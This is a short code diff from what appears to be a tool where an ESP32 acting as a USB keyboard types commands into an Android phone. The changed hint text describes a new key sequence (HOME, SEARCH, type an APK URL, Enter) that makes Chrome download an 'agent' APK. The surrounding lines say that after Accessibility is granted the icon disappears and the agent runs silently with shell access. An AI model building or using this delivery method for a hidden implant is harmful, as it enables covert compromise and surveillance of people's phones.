@@ -1557,8 +1557,8 @@ const OS_CONFIG = {
     label: 'Android (APK agent)',
     oneShot: () => publish({ type: 'shell', os: 'android' }),
     live:    () => publish({ type: 'shell', os: 'android' }),
-    hint: `ESP32 sends the <strong>AL Internet Browser</strong> HID key (0x0196) — opens the default browser on <em>any</em> Android version universally.<br>
-           Then presses <strong>Ctrl+L</strong> to focus the address bar and types the APK download URL.<br>
+    hint: `ESP32 presses <strong>HOME</strong> (home screen) → <strong>SEARCH</strong> key (opens Google search bar on any launcher) → types the APK URL → Enter.<br>
+           Chrome opens and downloads the APK automatically.<br>
            <strong>First install:</strong> Settings → Security → enable <em>Install unknown apps</em> for Chrome.<br>
            Open the app once, enable Accessibility, then the icon disappears and the agent runs silently.`,
   },
